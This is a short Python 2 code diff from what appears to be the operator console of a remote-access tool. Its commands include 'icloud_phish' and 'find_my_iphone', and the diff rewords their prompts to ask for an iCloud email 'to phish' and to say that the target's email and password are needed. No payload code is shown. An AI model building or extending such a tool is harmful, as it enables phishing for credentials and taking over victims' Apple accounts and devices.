@@ -198,7 +198,7 @@ if __name__ == '__main__':
                             else:
                                 print response
                         elif command.startswith("icloud_phish"):
-                            email = raw_input(MESSAGE_INPUT + "iCloud Email: ")
+                            email = raw_input(MESSAGE_INPUT + "iCloud email to phish: ")
 
                             if "@" not in email:
                                 print MESSAGE_ATTENTION + "Please specify an email address."
@@ -216,6 +216,7 @@ if __name__ == '__main__':
                                         print send_command(connections[current_client_id], "icloud_phish_stop")
                                         break
                         elif command == "find_my_iphone":
+                            print MESSAGE_INFO + "The target's email and password is required to get devices."
                             email = raw_input(MESSAGE_INPUT + "Email: ")
                             password = raw_input(MESSAGE_INPUT + "Password: ")
 
